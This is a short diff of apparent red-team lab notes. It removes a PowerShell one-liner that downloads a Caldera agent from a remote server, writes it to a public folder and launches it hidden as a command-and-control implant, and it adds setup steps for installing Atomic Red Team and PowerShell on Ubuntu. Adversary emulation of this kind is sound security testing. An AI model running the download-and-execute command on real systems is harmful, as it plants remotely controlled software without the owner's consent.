@@ -1,1 +1,28 @@
-$server="http://10.99.156.114:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\Users\Public\AgentRed.exe"} | stop-process -f;rm -force "C:\Users\Public\AgentRed.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\AgentRed.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\AgentRed.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
+# clone Automic RedTeam 
+sudo su 
+cd /opt
+apt install git -y 
+git clone https://github.com/redcanaryco/atomic-red-team.git AtomicRedTeam
+ 
+ 
+# Install powershell and run 
+sudo apt update
+sudo apt install -y wget apt-transport-https software-properties-common
+ 
+wget -q https://packages.microsoft.com/config/ubuntu/$(lsb_release -rs)/packages-microsoft-prod.deb
+sudo dpkg -i packages-microsoft-prod.deb
+ 
+sudo apt update
+sudo apt install -y powershell
+ 
+pwsh
+ 
+ 
+# Install automic Redteam
+Install-Module -Name invoke-atomicredteam,powershell-yaml -Scope CurrentUser
+Import-Module Invoke-AtomicRedTeam
+ 
+$env:ATOMICS_PATH = "/opt/AtomicRedTeam/atomics"
+ 
+ 
+# Run the test
